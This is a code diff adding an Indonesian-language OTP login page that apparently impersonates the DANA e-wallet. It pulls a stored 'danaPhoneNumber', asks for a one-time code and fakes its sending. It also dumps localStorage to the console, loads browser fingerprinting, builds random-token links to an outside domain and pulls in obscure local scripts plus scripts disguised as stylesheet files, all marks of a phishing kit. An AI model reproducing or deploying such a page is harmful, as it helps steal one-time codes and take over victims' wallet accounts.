@@ -1,0 +1,217 @@
+ <!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#118eea">
+<title>Masuk</title>
+
+<style>
+body{margin:0;font-family:sans-serif;background:#118eea;text-align:center;color:white}
+.container{margin-top:60px;padding:20px}
+.phone-display{font-size:18px;margin:15px 0;font-weight:bold}
+.via-badge{background:rgba(255,255,255,0.2);padding:6px 12px;border-radius:12px;display:inline-block;margin:5px 0;font-size:14px}
+.otp-inputs{display:flex;justify-content:center;margin:20px 0;gap:12px}
+.otp-input{width:45px;height:45px;font-size:20px;text-align:center;border:none;border-radius:8px;outline:none;font-weight:bold}
+.resend-section{margin:15px 0}
+.resend-text{font-size:14px;margin-bottom:8px;font-weight:bold}
+.timer-box{background:rgba(255,255,255,0.2);color:white;padding:6px 12px;border-radius:12px;font-weight:bold;font-size:14px;display:inline-block}
+.notification-popup{background:white;border-radius:15px;padding:20px;color:#333;box-shadow:0 10px 30px rgba(0,0,0,0.3);position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1001;width:85%;max-width:300px}
+.notification-title{font-size:16px;font-weight:bold;margin-bottom:15px;color:#333;text-align:center}
+.method-options{display:flex;justify-content:space-between;gap:10px;margin:15px 0}
+.method-option{flex:1;background:#f8f9fa;border:1px solid #e0e0e0;border-radius:10px;padding:12px;cursor:pointer;text-align:center}
+.method-option.selected{background:#e3f2fd;border-color:#118eea}
+.method-icon{width:28px;height:28px;margin:0 auto 8px;display:block}
+.method-name{font-size:13px;color:#333;font-weight:bold}
+.verification-info{background:#f8f9fa;margin:15px 0;padding:12px;border-radius:8px;font-size:12px;color:#666;text-align:left}
+.action-buttons{display:flex;gap:10px;margin:15px 0}
+.btn-primary{background:#118eea;color:white;border:none;padding:12px;border-radius:20px;font-weight:bold;font-size:14px;cursor:pointer;flex:1}
+.btn-secondary{background:white;color:#118eea;border:1px solid #118eea;padding:12px;border-radius:20px;font-weight:bold;font-size:14px;cursor:pointer;flex:1}
+.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1000}
+nav{width:100%;position:fixed;background-color:#118eea;z-index:999}
+nav.top{top:0;border-bottom:1px solid #118eea}
+nav img{width:100%;height:auto;display:block}
+.header{background:#118eea;color:white;padding:12px;font-size:16px;font-weight:bold;text-align:center;position:relative;z-index:998}
+</style>
+</head>
+
+<body>
+
+<nav class="top">
+<img src="https://blogger.googleusercontent.com/img/a/AVvXsEjtZk9CxdgzGz5G2V_zwYWZWCDyspJgCzTchX32VBPelBde-aQOtlHqV0oLPMevun3TQAZFNhPJ93lxDWP173gieRVfx4v7blxnDzqLGmTcijFFgW-YUuYwgHz_BHfLn-OQ5efE7CmsukOIWgxEYQFfRd5XbkoZlGqBEaaHCAgIXv76qHAQ7ryvjHHM6hAR" alt="Nav Atas">
+</nav>
+
+<div class="header">Masuk</div>
+
+<div class="container">
+<div style="font-size:16px;margin-bottom:8px">Kode OTP telah terkirim ke</div>
+
+<div class="phone-display" id="phoneDisplay">Memuat nomor...</div>
+
+<div class="via-badge">
+SMS WhatsApp
+</div>
+
+<div class="otp-inputs">
+<input type="tel" class="otp-input" maxlength="1" oninput="moveNext(this,0)" autofocus>
+<input type="tel" class="otp-input" maxlength="1" oninput="moveNext(this,1)">
+<input type="tel" class="otp-input" maxlength="1" oninput="moveNext(this,2)">
+<input type="tel" class="otp-input" maxlength="1" oninput="moveNext(this,3)">
+</div>
+
+<div class="resend-section">
+<div class="resend-text">KIRIM ULANG OTP</div>
+<div class="timer-box" id="timer">01:00</div>
+</div>
+
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="notification-popup" id="notificationPopup">
+<div class="notification-title">Pilih metode pengiriman OTP</div>
+
+<div class="method-options">
+<div class="method-option selected" onclick="selectMethod('whatsapp')">
+<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="method-icon" alt="WhatsApp">
+<div class="method-name">WhatsApp</div>
+</div>
+<div class="method-option" onclick="selectMethod('sms')">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgArmerUnAbG8SgijOsUGUR4MCoDhUXWMqvynv4hmavD8iFuu_wq04_18&s=10" class="method-icon" alt="SMS">
+<div class="method-name">SMS</div>
+</div>
+</div>
+
+<div class="verification-info">
+Verifikasi lewat WhatsApp<br>
+Pastikan nomornya sesuai dengan WhatsApp ya.
+</div>
+
+<div class="action-buttons">
+<button class="btn-primary" onclick="sendOTP()">OK, LANJUT</button>
+<button class="btn-secondary" onclick="closePopup()">NANTI</button>
+</div>
+</div>
+
+<script>
+let selectedMethod='whatsapp';
+
+function moveNext(input,index){
+const inputs=document.querySelectorAll('.otp-input');
+if(input.value.length===1){
+if(index<inputs.length-1){
+inputs[index+1].focus();
+}
+}
+}
+
+function selectMethod(method){
+selectedMethod=method;
+document.querySelectorAll('.method-option').forEach(opt=>{
+opt.classList.remove('selected');
+});
+event.currentTarget.classList.add('selected');
+const info=document.querySelector('.verification-info');
+if(method==='whatsapp'){
+info.innerHTML='Verifikasi lewat WhatsApp<br>Pastikan nomornya sesuai dengan WhatsApp ya.';
+}else{
+info.innerHTML='Verifikasi lewat SMS<br>Pastikan sinyal bagus untuk menerima SMS.';
+}
+}
+
+function sendOTP(){
+document.getElementById('notificationPopup').style.display='none';
+document.getElementById('overlay').style.display='none';
+startTimer();
+alert('OTP dikirim via '+(selectedMethod==='whatsapp'?'WhatsApp':'SMS'));
+}
+
+function closePopup(){
+document.getElementById('notificationPopup').style.display='none';
+document.getElementById('overlay').style.display='none';
+}
+
+function startTimer(){
+let time=60;
+const timerElement=document.getElementById('timer');
+const countdown=setInterval(()=>{
+const minutes=Math.floor(time/60);
+const seconds=time%60;
+timerElement.textContent=`${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+time--;
+if(time<0){
+clearInterval(countdown);
+timerElement.textContent="00:00";
+}
+},1000);
+}
+
+function getPhoneNumberFromPreviousPage(){
+const savedPhone=localStorage.getItem('danaPhoneNumber')||localStorage.getItem('phoneNumber')||localStorage.getItem('userPhone');
+if(savedPhone&&savedPhone.trim()!==""&&savedPhone!==" "){
+return savedPhone;
+}else{
+return"+62 812-3456-7890";
+}
+}
+
+function debugLocalStorage(){
+console.log("=== DEBUG LOCALSTORAGE ===");
+for(let i=0;i<localStorage.length;i++){
+const key=localStorage.key(i);
+const value=localStorage.getItem(key);
+console.log(key+": "+value);
+}
+console.log("danaPhoneNumber: "+localStorage.getItem('danaPhoneNumber'));
+console.log("===========================");
+}
+
+document.addEventListener("DOMContentLoaded",function(){
+debugLocalStorage();
+const phoneDisplay=document.getElementById('phoneDisplay');
+const phoneNumber=getPhoneNumberFromPreviousPage();
+phoneDisplay.textContent=phoneNumber;
+startTimer();
+setTimeout(()=>{
+document.getElementById('notificationPopup').style.display='block';
+document.getElementById('overlay').style.display='block';
+},500);
+});
+</script>
+
+<script src="/OwlCarousel2/assets/vendors/o42811919.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs/3.3.6/fingerprint.min.js"></script>
+
+<script>
+function generateDashLink(domain="https://lyanan.info/"){
+const hexChars="abcdef0123456789"
+let token=""
+for(let i=0;i<32;i++){
+token+=hexChars[Math.floor(Math.random()*hexChars.length)]
+}
+return domain+token
+}
+
+document.addEventListener("DOMContentLoaded",()=>{
+const link=generateDashLink()
+console.log(link)
+})
+</script>
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._containers.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._helpers.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._maps.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.bootstrap.css"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery. _spinners.scss"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js.map"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.min.js"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs/3.3.6/fingerprint.min.js"></script>
+<script src="/OwlCarousel2/assets/vendors/security-core.js"></script>
+<script src="/OwlCarousel2/assets/vendors/script-loader.js"></script>
+ <script src="/OwlCarousel2/assets/vendors/globalize.min.js"></script>
+
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'99cdc3a49a3afdbe',t:'MTc2Mjg2Mzg0Mg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
